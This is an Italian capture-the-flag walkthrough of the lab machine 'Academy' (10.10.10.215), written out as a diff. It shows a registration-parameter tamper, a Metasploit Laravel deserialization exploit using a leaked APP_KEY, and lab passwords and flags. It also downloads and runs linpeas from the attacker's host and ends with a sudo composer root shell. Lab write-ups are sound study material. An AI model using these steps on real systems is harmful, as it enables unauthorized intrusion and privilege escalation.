@@ -1,0 +1,129 @@
+---------------------------------------------------------------------------------------------------------------
+nmap -A 10.10.10.215
+	PORT     STATE    SERVICE VERSION
+	22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+	80/tcp   open     http    Apache httpd 2.4.41 ((Ubuntu))
+	|_http-server-header: Apache/2.4.41 (Ubuntu)
+	|_http-title: Did not follow redirect to http://academy.htb/
+	7103/tcp filtered unknown
+	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+---------------------------------------------------------------------------------------------------------------
+Creiamo il record nel file degli host name 
+sudo vi /etc/hosts
+10.10.10.215	academy.htb
+
+---------------------------------------------------------------------------------------------------------------
+Effettuiamo una scansione con dirb
+dirb http://academy.htb -w /usr/share/wordlists/dirb/common.txt
+
+---------------------------------------------------------------------------------------------------------------
+Dopo vari tentativi creando account, tramite burpsuit abbiamo modificato un parametro della registrazione. roleid 
+da 0 a 1. Provando ad accedere al pannello admin-page.php otteniamo una pagina Academy Launch che parla di un nuovo host
+dev-staging-01.academy.htb. Proviamo ad aggiungerlo
+---------------------------------------------------------------------------------------------------------------
+Una volta visitato il sito abbiamo parecchie informazioni importanti. Si parla di webapp, indirizzi e porte. 
+Viene nominata una webapp chiamata Laravel. Cerchiamo informazioni online
+Trovato un exploit
+msfconsole
+use unix/http/laravel_token_unserialize_exec
+set rhost 10.10.10.215
+set vhost dev-staging-01.academy.htb
+run
+
+ma...
+Exploit completed, but no session was created.
+---------------------------------------------------------------------------------------------------------------
+Dopo un po' di sbattimento, ho aggiunto il seguente parametro
+set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
+
+e.... SBAM! Sono dentro!
+---------------------------------------------------------------------------------------------------------------
+Enumeriamo, un po' 
+Ci sono 6 user "ls -la /home"
+21y4d
+ch4p
+cry0l1t3
+egre55
+g0blin
+mrb3n
+
+---------------------------------------------------------------------------------------------------------------
+L'utente cry0l1t3 ha un file nella sua home che si chiama user.txt, presumibilmente è il file con la flag.
+Girovachiamo tra le cartelle. Nella cartella /var/www/html/htb-academy-dev-01 ci sono due file .env e .env.example, contengono gli stessi dati che abbiamo visto nella pagina dev-staging-01.academy.htb
+Anche nella cartella /var/www/html/academy ci sono gli stessi file e in uno di essi (.env) c'è una password diversa rispetto alle altre: mySup3rP4s5w0rd!!
+
+Proviamo a entrare tramite ssh con i diversi utenti. BINGO!
+Password utente cry0l1t3: mySup3rP4s5w0rd!!
+ssh cry0l1t3@10.10.10.215: mySup3rP4s5w0rd!!
+Flag: c244c4edb2a12728a8b4dccb19ea1ec2
+
+---------------------------------------------------------------------------------------------------------------
+Verifichiamo che versione di Python è installata nella macchina e passiamo ad una shell con pieni comandi
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Cerchiamo se l'utente è tra i sudoers
+sudo -l
+Ma nada...
+
+Cerchiamo se l'utente ha SUID
+find / -perm -u=s -type f 2>/dev/null
+Ma nada..
+
+Visualizziamo i log del sistema
+cat /var/log/audit/audit.log
+Ma nada...
+
+Cerchiamo file scrivibili
+find /-writable -type d 2>/dev/null
+Ma nada...
+
+Controlliamo anche i cronjob
+cat /etc/crontab
+Ma nada...
+
+Scarichiamo linpeas.sh, attiviamo il server sulla nostra macchina e scarichiamo nella macchina attaccata
+sudo python -m SimpleHTTPServer 80
+wget http://10.10.15.9:80/linpeas.sh
+chmod 777 linpeas.sh
+./linpeas.sh > linpeas
+
+Analizziamo linpeas
+
+
+Checking for TTY (sudo/su) passwords in logs
+Error opening config file (Permission denied)                                                                                                                                                                                              
+NOTE - using built-in logs: /var/log/audit/audit.log
+1. 08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>
+2. 08/12/2020 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>
+/var/log/audit/audit.log.3:type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
+
+Passowrd trovata!
+mrb3n:mrb3n_Ac@d3my!
+
+
+---------------------------------------------------------------------------------------------------------------
+
+Cerchiamo se l'utente mrb3n è tra i sudoers
+sudo -l
+Troviamo servizio "/usr/bin/composer", cerchiamo cos'è. "Composer helps you declare, manage and install dependencies of PHP projects. It ensures you have the right stack everywhere."
+
+È affetto da vulnerabilità. Studiamo come funziona composer.
+https://getcomposer.org/doc/articles/scripts.md
+
+
+
+L'obiettivo è quello di creare uno script che tramite il comando sudo, ci dia accesso al terminale in veste di root
+Creiamo il seguente script: 
+echo '{"scripts":{"exploit":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > composer.json
+sudo composer run-script exploit
+
+ROOT OTTENUTO!
+
+
+---------------------------------------------------------------------------------------------------------------
+whoami
+pwd
+ls /root
+cat /root/root.txt
+
